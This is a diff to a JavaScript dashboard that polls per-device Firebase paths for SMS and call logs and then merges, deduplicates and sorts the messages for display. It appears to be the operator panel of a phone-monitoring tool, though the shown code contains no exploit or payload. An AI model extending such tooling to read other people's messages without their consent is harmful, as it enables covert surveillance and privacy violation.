@@ -1526,14 +1526,78 @@ function restPoll(fbId,path,cb){
   tick();
   activeListeners[fbId+'::rest::'+path]={type:'rest',timer:setInterval(tick,12000)};
 }
+function smsAsList(raw){
+  if(!raw) return [];
+  if(Array.isArray(raw)) return raw;
+  if(typeof raw==='object'){
+    return Object.keys(raw).sort(function(a,b){
+      var na=Number(a), nb=Number(b);
+      if(!isNaN(na)&&!isNaN(nb)) return na-nb;
+      return String(a).localeCompare(String(b));
+    }).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
+  }
+  return [];
+}
+function parseDdMmYyyy(s){
+  if(!s||typeof s!=='string') return 0;
+  var m=String(s).trim().match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})(?:\s+(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
+  if(!m) return 0;
+  var dd=+m[1], MM=+m[2], yyyy=+m[3], hh=+(m[4]||0), mi=+(m[5]||0), ss=+(m[6]||0), ap=m[7];
+  if(ap){var p=ap.toUpperCase(); if(p==='PM'&&hh<12)hh+=12; if(p==='AM'&&hh===12)hh=0;}
+  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
+  return isNaN(ms)?0:ms;
+}
+function ingestAllSmsPayload(d){
+  var list=[], total=0;
+  if(!d) return {list:list,total:0};
+  if(d.messages!=null) list=smsAsList(d.messages).map(function(m,i){
+    var n=normalizeSmsRecord(m);
+    if(n){n._sortKey=String(i);return n;}
+    return null;
+  }).filter(Boolean);
+  else if(typeof d==='object'&&!Array.isArray(d)) list=smsAsList(d).map(function(m,i){
+    var n=normalizeSmsRecord(m);
+    if(n){n._sortKey=String(i);return n;}
+    return null;
+  }).filter(Boolean);
+  total=d.total_count!=null?d.total_count:list.length;
+  return {list:list,total:total};
+}
+function ingestNewSmsPayload(d){
+  var list=[];
+  smsAsList(d).forEach(function(m,i){
+    var n=normalizeSmsRecord(m);
+    if(n){n._sortKey='n'+i; list.push(n);}
+  });
+  if(!list.length&&d&&typeof d==='object'&&!Array.isArray(d)){
+    Object.keys(d).forEach(function(k){
+      var n=normalizeSmsRecord(d[k]);
+      if(n){n._sortKey=k; list.push(n);}
+    });
+  }
+  return list;
+}
 function loadRabelSms(dev){
   restPoll(dev.fbId,'messages/'+dev.rawId,function(data){
     var msgs=[];
     if(data&&typeof data==='object') Object.keys(data).forEach(function(k){
       var n=normalizeSmsRecord(data[k]);
-      if(n) msgs.push(n);
+      if(n){n._sortKey=k; msgs.push(n);}
     });
     window._allSmsData=msgs; window._newSmsData=[]; window._allSmsTotal=msgs.length;
+    renderSmsList();
+  });
+}
+function loadSmsRest(dev){
+  var ref=dev.deviceNode+'/'+dev.rawId;
+  restPoll(dev.fbId,ref+'/all_sms',function(d){
+    var p=ingestAllSmsPayload(d);
+    window._allSmsData=p.list;
+    window._allSmsTotal=p.total;
+    renderSmsList();
+  });
+  restPoll(dev.fbId,ref+'/new_sms',function(d){
+    window._newSmsData=ingestNewSmsPayload(d);
     renderSmsList();
   });
 }
@@ -1576,25 +1640,25 @@ function ensureTabLoaded(tab){
   }
   var ref=dev.deviceNode+'/'+dev.rawId;
   if(tab==='sms'){
-    devOn(dev.fbId,ref+'/new_sms',function(snap){
-      if(!snap.exists()) return;
-      var newMsgs=[]; snap.forEach(function(c){var n=normalizeSmsRecord(c.val());if(n)newMsgs.push(n);});
-      window._newSmsData=newMsgs; renderSmsList();
-    });
-    devOn(dev.fbId,ref+'/all_sms',function(snap){
-      var d=snap.val(), list=[];
-      if(d&&d.messages&&Array.isArray(d.messages)){
-        d.messages.forEach(function(m){var n=normalizeSmsRecord(m);if(n)list.push(n);});
-      }else if(d&&typeof d==='object'){
-        Object.keys(d).forEach(function(k){
-          if(k==='messages'||k==='total_count') return;
-          var n=normalizeSmsRecord(d[k]); if(n) list.push(n);
+    if(inst&&inst.db){
+      devOn(dev.fbId,ref+'/new_sms',function(snap){
+        var list=[];
+        if(snap.exists()) snap.forEach(function(c){
+          var n=normalizeSmsRecord(c.val());
+          if(n){n._sortKey=c.key; list.push(n);}
         });
-      }
-      window._allSmsData=list;
-      window._allSmsTotal=d?(d.total_count||list.length):list.length;
-      renderSmsList();
-    });
+        window._newSmsData=list;
+        renderSmsList();
+      });
+      devOn(dev.fbId,ref+'/all_sms',function(snap){
+        var p=ingestAllSmsPayload(snap.val());
+        window._allSmsData=p.list;
+        window._allSmsTotal=p.total;
+        renderSmsList();
+      });
+    }else{
+      loadSmsRest(dev);
+    }
   } else if(tab==='calls'){
     devOn(dev.fbId,ref+'/all_calls',function(snap){
       var d=snap.val(), tb=document.getElementById('callsTbody');
@@ -1742,6 +1806,8 @@ function smsToMs(v){
   if(typeof v==='string'){
     var t=Date.parse(v);
     if(!isNaN(t)) return t;
+    var d2=parseDdMmYyyy(v);
+    if(d2) return d2;
   }
   return 0;
 }
@@ -1776,15 +1842,28 @@ function smsIsNew(s,newMsgs){
   }
   return false;
 }
+function smsDedupKey(m){
+  return String(m.date||0)+'|'+String(m.address||'')+'|'+String(m.body||'').slice(0,100);
+}
+function smsSortDesc(a,b){
+  var ta=a.date||smsMsgTime(a)||0, tb=b.date||smsMsgTime(b)||0;
+  if(tb!==ta) return tb-ta;
+  return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
+}
 function renderSmsList(){
   var tb=document.getElementById('smsTbody');
-  var newMsgs=window._newSmsData||[];
-  var allMsgs=window._allSmsData||[];
+  var newMsgs=(window._newSmsData||[]).slice();
+  var allMsgs=(window._allSmsData||[]).slice();
   var total=window._allSmsTotal||0;
-  var newDates=newMsgs.map(function(m){return m.date;});
-  var filteredAll=allMsgs.filter(function(m){return newDates.indexOf(m.date)<0;});
+  var newKeys={}, ni;
+  for(ni=0;ni<newMsgs.length;ni++) newKeys[smsDedupKey(newMsgs[ni])]=1;
+  var filteredAll=[];
+  for(ni=0;ni<allMsgs.length;ni++){
+    var k=smsDedupKey(allMsgs[ni]);
+    if(!newKeys[k]) filteredAll.push(allMsgs[ni]);
+  }
   var merged=newMsgs.concat(filteredAll);
-  merged.sort(function(a,b){return smsMsgTime(b)-smsMsgTime(a);});
+  merged.sort(smsSortDesc);
   merged=merged.slice(0,100);
   window._smsData=merged;
   document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';
